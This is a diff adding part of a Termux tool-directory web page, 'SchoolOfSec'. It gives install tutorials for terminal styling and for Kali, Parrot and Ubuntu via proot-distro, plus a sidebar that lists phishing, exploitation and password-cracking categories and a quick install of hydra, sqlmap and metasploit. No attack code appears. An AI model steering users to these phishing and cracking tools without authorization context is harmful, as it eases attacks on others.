+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Termux Style','<p><strong>Install:</strong></p><pre>pkg install git\ngit clone https://github.com/adi1090x/termux-style\ncd termux-style\n./install</pre><p><strong>Run:</strong></p><pre>termux-style</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-style" data-cat="style" data-name="termux banner fig">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#0d0010,#18001a)"><span class="tc-rank">#02</span>🖼️</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Termux Banner (figlet)</div><div class="tc-ver">Latest · ASCII Art</div></div>
+          <div class="tc-badges"><span class="tcb" style="background:rgba(232,121,249,.12);color:#e879f9;border:1px solid rgba(232,121,249,.3)">Style</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">Create stylish ASCII art banners and custom greetings for your Termux terminal. Use figlet, toilet and lolcat to make your terminal prompt stand out with large colourful text art displays.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#banner</span><span class="tc-tag">#figlet</span><span class="tc-tag">#ascii</span><span class="tc-tag">#lolcat</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Termux Banner','<p><strong>Install:</strong></p><pre>pkg install figlet toilet lolcat</pre><p><strong>Create banner:</strong></p><pre>figlet -f slant SCHOOLOFSEC | lolcat</pre><p><strong>Add to bashrc:</strong></p><pre>echo \'figlet SCHOOLOFSEC | lolcat\' >> ~/.bashrc</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+  </div>
+
+  <!-- LINUX DISTROS -->
+  <div class="cat-section-hd" data-section="distro" style="background:rgba(251,146,60,.06);border:1px solid rgba(251,146,60,.2)">
+    <div class="csh-icon">🐧</div>
+    <div class="csh-info">
+      <div class="csh-title">Linux Distros in Termux</div>
+      <div class="csh-desc">Run full Linux distributions inside Termux via proot-distro</div>
+    </div>
+    <div class="csh-count" style="color:#fb923c">3 Tools</div>
+  </div>
+  <div class="info-box">
+    <i class="fa fa-info-circle"></i>
+    <p><strong>How it works:</strong> All distros below run inside Termux using proot-distro And no root required.</p>
+  </div>
+  <div class="tools-list">
+
+    <div class="tool-card tc-distro" data-cat="distro" data-name="kali nethunter kali linux">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#00050d,#000f1a)"><span class="tc-rank">#01</span>🐉</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Kali NetHunter</div><div class="tc-ver">2026.1 · via proot-distro</div></div>
+          <div class="tc-badges"><span class="tcb" style="background:rgba(251,146,60,.1);color:#fb923c;border:1px solid rgba(251,146,60,.3)">Distro</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">The full Kali Linux environment running inside Termux via proot. Access 600+ security tools including Metasploit, Nmap, Burp Suite, Hydra and all Kali packages without rooting your Android device.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#kali</span><span class="tc-tag">#nethunter</span><span class="tc-tag">#linux</span><span class="tc-tag">#600+tools</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Kali NetHunter','<p><strong>Install proot-distro:</strong></p><pre>pkg install proot-distro</pre><p><strong>Install Kali:</strong></p><pre>proot-distro install kali</pre><p><strong>Login:</strong></p><pre>proot-distro login kali</pre><p><strong>Update Kali:</strong></p><pre>apt update && apt full-upgrade -y</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-distro" data-cat="distro" data-name="parrot os parrot">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#001518,#002025)"><span class="tc-rank">#02</span>🦜</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Parrot OS</div><div class="tc-ver">5.x · via proot-distro</div></div>
+          <div class="tc-badges"><span class="tcb" style="background:rgba(251,146,60,.1);color:#fb923c;border:1px solid rgba(251,146,60,.3)">Distro</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">Parrot Security OS inside Termux via proot. Lightweight alternative to Kali with a complete security toolset. Great for forensics, privacy tools and pentesting on low-spec Android devices.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#parrot</span><span class="tc-tag">#security</span><span class="tc-tag">#linux</span><span class="tc-tag">#forensics</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Parrot OS','<p><strong>Install:</strong></p><pre>pkg install proot-distro\nproot-distro install parrot</pre><p><strong>Login:</strong></p><pre>proot-distro login parrot</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-distro" data-cat="distro" data-name="ubuntu">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#100500,#1a0c00)"><span class="tc-rank">#03</span>🟠</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Ubuntu in Termux</div><div class="tc-ver">24.04 LTS · via proot-distro</div></div>
+          <div class="tc-badges"><span class="tcb" style="background:rgba(251,146,60,.1);color:#fb923c;border:1px solid rgba(251,146,60,.3)">Distro</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">Full Ubuntu 24.04 LTS running inside Termux via proot. Most beginner-friendly Linux distribution with a huge package repository. Install with <code style="color:var(--g)">proot-distro install ubuntu</code> — no root needed.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#ubuntu</span><span class="tc-tag">#linux</span><span class="tc-tag">#apt</span><span class="tc-tag">#beginner</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Ubuntu in Termux','<p><strong>Install:</strong></p><pre>pkg install proot-distro\nproot-distro install ubuntu</pre><p><strong>Login:</strong></p><pre>proot-distro login ubuntu</pre><p><strong>Update:</strong></p><pre>apt update && apt upgrade -y</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+  </div>
+
+  <!-- No Results Msg -->
+  <div id="noResults" style="display:none;text-align:center;padding:40px 20px;color:var(--t3)">
+    <div style="font-size:36px;margin-bottom:10px">🔍</div>
+    <div style="font-family:var(--head);font-size:16px;color:var(--t2);margin-bottom:6px">No Tools Found</div>
+    <div style="font-size:11px">Try A Different Search Term Or Category</div>
+  </div>
+
+  </div>
+  <!-- ToolsContainer -->
+
+  <!-- ═══════════════════ SIDEBAR ═══════════════════ -->
+  <div class="sidebar">
+
+    <!-- Download Termux -->
+    <div class="widget" style="background:var(--g4);border-color:rgba(0,255,136,.2)">
+      <div class="w-bd" style="padding:14px">
+        <div style="font-size:9px;color:var(--g);letter-spacing:2px;text-transform:uppercase;margin-bottom:5px">📱 Required</div>
+        <div style="font-family:var(--head);font-size:17px;font-weight:800;color:var(--t1);margin-bottom:4px">Download Termux</div>
+        <div style="font-size:10px;color:var(--t2);margin-bottom:10px">Free · No Root · 600+ Packages · v0.118</div>
+        <a href="https://f-droid.org/packages/com.termux/" target="_blank" class="btn-dl" onclick="showToast('Redirecting to F-Droid...')"><i class="fa fa-download"></i> Download from F-Droid</a>
+        <a href="https://github.com/termux/termux-app/releases" target="_blank" class="btn-dl-sec" onclick="showToast('Redirecting to GitHub...')"><i class="fab fa-github"></i> GitHub APK</a>
+        <div style="font-size:9px;color:var(--r);margin-top:8px;text-align:center">⚠️ Don't use Play Store version</div>
+      </div>
+    </div>
+
+    <!-- Categories -->
+    <div class="widget">
+      <div class="w-hd"><div class="w-title"><i class="fa fa-folder"></i> Categories</div></div>
+      <div class="w-bd" style="padding:6px">
+        <div class="cat-list-item" onclick="filterCat('all',null)">
+          <div class="cli-left"><div class="cli-dot" style="background:var(--g)"></div><span class="cli-name">All Tools</span></div>
+          <span class="cli-count">30</span>
+        </div>
+        <div class="cat-list-item" onclick="filterCat('exploit',null)">
+          <div class="cli-left"><div class="cli-dot" style="background:var(--r)"></div><span class="cli-name">Exploitation</span></div>
+          <span class="cli-count">5</span>
+        </div>
+        <div class="cat-list-item" onclick="filterCat('network',null)">
+          <div class="cli-left"><div class="cli-dot" style="background:var(--b)"></div><span class="cli-name">Network Tools</span></div>
+          <span class="cli-count">4</span>
+        </div>
+        <div class="cat-list-item" onclick="filterCat('phishing',null)">
+          <div class="cli-left"><div class="cli-dot" style="background:var(--p)"></div><span class="cli-name">Phishing</span></div>
+          <span class="cli-count">5</span>
+        </div>
+        <div class="cat-list-item" onclick="filterCat('osint',null)">
+          <div class="cli-left"><div class="cli-dot" style="background:var(--g)"></div><span class="cli-name">OSINT</span></div>
+          <span class="cli-count">5</span>
+        </div>
+        <div class="cat-list-item" onclick="filterCat('recon',null)">
+          <div class="cli-left"><div class="cli-dot" style="background:var(--y)"></div><span class="cli-name">Recon</span></div>
+          <span class="cli-count">3</span>
+        </div>
+        <div class="cat-list-item" onclick="filterCat('password',null)">
+          <div class="cli-left"><div class="cli-dot" style="background:var(--o)"></div><span class="cli-name">Password Tools</span></div>
+          <span class="cli-count">2</span>
+        </div>
+        <div class="cat-list-item" onclick="filterCat('system',null)">
+          <div class="cli-left"><div class="cli-dot" style="background:#38bdf8"></div><span class="cli-name">System Tools</span></div>
+          <span class="cli-count">2</span>
+        </div>
+        <div class="cat-list-item" onclick="filterCat('style',null)">
+          <div class="cli-left"><div class="cli-dot" style="background:#e879f9"></div><span class="cli-name">Style &amp; UI</span></div>
+          <span class="cli-count">2</span>
+        </div>
+        <div class="cat-list-item" onclick="filterCat('distro',null)">
+          <div class="cli-left"><div class="cli-dot" style="background:#fb923c"></div><span class="cli-name">Linux Distros</span></div>
+          <span class="cli-count">3</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Quick Install -->
+    <div class="widget">
+      <div class="w-hd"><div class="w-title"><i class="fa fa-terminal"></i> Quick Install</div></div>
+      <div class="qi-code" onclick="copyToClipboard(this)"><span style="color:var(--t3)"># Essential tools in Termux</span>
+<span style="color:var(--g)">pkg install -y \</span>
+<span style="color:var(--b)">  nmap hydra git \</span>
+<span style="color:var(--b)">  python openssh \</span>
+<span style="color:var(--b)">  sqlmap metasploit</span>
+
+<span style="color:var(--t3)"># Install Linux distro</span>
+<span style="color:var(--g)">pkg install proot-distro</span>
+<span style="color:var(--b)">proot-distro install kali</span></div>
+    </div>
+
+    <!-- Stats -->
+    <div class="widget">
+      <div class="w-hd"><div class="w-title"><i class="fa fa-chart-bar"></i> Directory Stats</div></div>
+      <div class="sgrid">
+        <div class="sbox"><span class="sn counter" data-target="30">0</span><span class="sl">Tools Listed</span></div>
+        <div class="sbox"><span class="sn counter" data-target="10">0</span><span class="sl">Categories</span></div>
+        <div class="sbox"><span class="sn">100%</span><span class="sl">Free Tools</span></div>
+        <div class="sbox"><span class="sn">2026</span><span class="sl">Updated</span></div>
+      </div>
+    </div>
+
+    <!-- Trending -->
+    <div class="widget">
+      <div class="w-hd"><div class="w-title"><i class="fa fa-fire"></i> Most Viewed</div></div>
+      <div class="w-bd" style="padding:4px">
+        <div class="trow"><div class="tr-n h">01</div><div class="tr-inf"><div class="tr-t">Metasploit on Termux</div><div class="tr-m">91K views · Today</div></div></div>
+        <div class="trow"><div class="tr-n h">02</div><div class="tr-inf"><div class="tr-t">Zphisher Full Guide</div><div class="tr-m">78K views · Today</div></div></div>
+        <div class="trow"><div class="tr-n">03</div><div class="tr-inf"><div class="tr-t">Nmap Cheat Sheet 2026</div><div class="tr-m">88K views</div></div></div>
+        <div class="trow"><div class="tr-n">04</div><div class="tr-inf"><div class="tr-t">Sherlock Username OSINT</div><div class="tr-m">62K views</div></div></div>
+        <div class="trow"><div class="tr-n">05</div><div class="tr-inf"><div class="tr-t">PhoneInfoga Tutorial</div><div class="tr-m">54K views</div></div></div>
+      </div>
+    </div>
+
+    <!-- Tags -->
+    <div class="widget">
+      <div class="w-hd"><div class="w-title"><i class="fa fa-tags"></i> Popular Tags</div></div>
+      <div class="tcloud">
+        <span class="tg" onclick="liveSearch('termux')">#termux</span><span class="tg" onclick="liveSearch('nmap')">#nmap</span><span class="tg" onclick="liveSearch('metasploit')">#metasploit</span>
+        <span class="tg" onclick="liveSearch('phishing')">#phishing</span><span class="tg" onclick="liveSearch('osint')">#osint</span><span class="tg" onclick="liveSearch('hydra')">#hydra</span>
+        <span class="tg" onclick="liveSearch('kali')">#kali</span><span class="tg" onclick="liveSearch('python')">#python</span><span class="tg" onclick="liveSearch('android')">#android</span>
+        <span class="tg" onclick="liveSearch('sherlock')">#sherlock</span><span class="tg" onclick="liveSearch('wifi')">#wifi</span><span class="tg" onclick="liveSearch('exploit')">#exploit</span>
+        <span class="tg" onclick="liveSearch('zphisher')">#zphisher</span><span class="tg" onclick="liveSearch('linux')">#linux</span><span class="tg" onclick="liveSearch('recon')">#recon</span>
+      </div>
+    </div>
+
+  </div><!-- /sidebar -->
+  </div><!-- /page-layout -->
+</div><!-- /wrap -->
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-top">
+    <div>
+      <div class="logo-wrap" style="margin-bottom:8px">
+        <div class="logo-box" style="width:36px;height:36px;font-size:18px"><a href="#"><img src="assets/profile.png" alt="SchoolOfSec logo"/></a></div>
+        <div class="logo-text">
+          <span class="logo-main" style="font-size:20px">SchoolOf<span>Sec</span></span>
+          <span class="logo-sub">Est. 2026</span>
+        </div>
+      </div>
+      <p class="fb-desc">Your ultimate source for Linux tools, Termux tutorials, pentesting guides and Android terminal hacks. Trusted by 142,000+ readers worldwide.</p>
+      <div class="soc-row">
+        <a href="https://t.me/termux_tools_official" target="_blank" class="soc-btn" onclick="showToast('Opening Telegram...')"><i class="fab fa-telegram"></i></a>
+        <a href="#" class="soc-btn" onclick="showToast('Opening YouTube...')"><i class="fab fa-youtube"></i></a>
+        <a href="#" class="soc-btn" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i></a>
+        <a href="#" class="soc-btn" onclick="showToast('Opening Twitter...')"><i class="fab fa-twitter"></i></a>
+        <a href="https://whatsapp.com/channel/0029Vaia9SGHbFUxOSZvwB1y" target="_blank" class="soc-btn" onclick="showToast('Opening WhatsApp...')"><i class="fab fa-whatsapp"></i></a>
+        <a href="#" class="soc-btn" onclick="showToast('Opening Discord...')"><i class="fab fa-discord"></i></a>
+      </div>
+    </div>
+    <div>
+      <div class="fc-t">Linux Tools</div>
+      <ul class="f-links">
+        <li><a href="#" onclick="filterCat('network',null)"><i class="fa fa-chevron-right"></i>Nmap &amp; Recon</a></li>
+        <li><a href="#" onclick="filterCat('exploit',null)"><i class="fa fa-chevron-right"></i>Metasploit</a></li>
+        <li><a href="#" onclick="filterCat('password',null)"><i class="fa fa-chevron-right"></i>Hydra &amp; Password</a></li>
+        <li><a href="#" onclick="filterCat('network',null)"><i class="fa fa-chevron-right"></i>Aircrack-ng WiFi</a></li>
+        <li><a href="#"><i class="fa fa-chevron-right"></i>SQLmap</a></li>
+        <li><a href="#"><i class="fa fa-chevron-right"></i>Wireshark</a></li>
+      </ul>
+    </div>
+    <div>
+      <div class="fc-t">Termux</div>
+      <ul class="f-links">
+        <li><a href="https://f-droid.org/packages/com.termux/" target="_blank" onclick="showToast('Redirecting to F-Droid...')"><i class="fa fa-download"></i>Download Termux</a></li>
+        <li><a href="#"><i class="fa fa-chevron-right"></i>Installation Guide</a></li>
+        <li><a href="#"><i class="fa fa-chevron-right"></i>Package List</a></li>
+        <li><a href="#"><i class="fa fa-chevron-right"></i>Scripts &amp; Hacks</a></li>
+        <li><a href="#"><i class="fa fa-chevron-right"></i>Beginner Guide</a></li>
+        <li><a href="#"><i class="fa fa-chevron-right"></i>Troubleshooting</a></li>
+      </ul>
+    </div>
+    <div>
+      <div class="fc-t">Company</div>
+      <ul class="f-links">
+        <li><a href="#"><i class="fa fa-chevron-right"></i>About Us</a></li>
+        <li><a href="#"><i class="fa fa-chevron-right"></i>Write For Us</a></li>
+        <li><a href="#"><i class="fa fa-chevron-right"></i>Contact</a></li>
+        <li><a href="#"><i class="fa fa-chevron-right"></i>Privacy Policy</a></li>
+        <li><a href="#"><i class="fa fa-chevron-right"></i>Terms of Service</a></li>
+        <li><a href="#"><i class="fa fa-chevron-right"></i>RSS Feed</a></li>
+      </ul>
+    </div>
+  </div>
+  <div class="footer-bot">
+    <div class="fb-l">
+      <span>© 2026 SchoolOfSec. All rights reserved.</span>
+      <span>For educational purposes only.</span>
+    </div>
+    <div class="fb-r">
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+      <a href="#">Sitemap</a>
+      <a href="#">RSS</a>
+    </div>
+  </div>
+</footer>
+
+<!-- BACK TO TOP -->
+<div id="backToTop" onclick="window.scrollTo({top:0,behavior:'smooth'})"><i class="fa fa-arrow-up"></i></div>
+
+<script src="js/main.js"></script>
+</body>
+</html>
